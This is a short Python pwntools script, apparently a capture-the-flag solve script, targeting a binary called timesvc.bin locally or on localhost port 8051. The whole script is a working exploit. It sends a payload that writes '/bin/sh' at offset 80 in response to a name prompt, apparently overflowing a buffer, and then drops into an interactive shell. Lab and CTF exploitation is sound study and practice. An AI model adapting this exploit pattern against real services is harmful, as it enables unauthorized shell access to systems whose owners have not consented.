from pwn import *

if 'REMOTE' in args:
    p = remote("localhost", 8051)
else:
    p = process("dist/timesvc.bin")

p.sendlineafter("name?", flat({ 80: "/bin/sh" }))
p.interactive()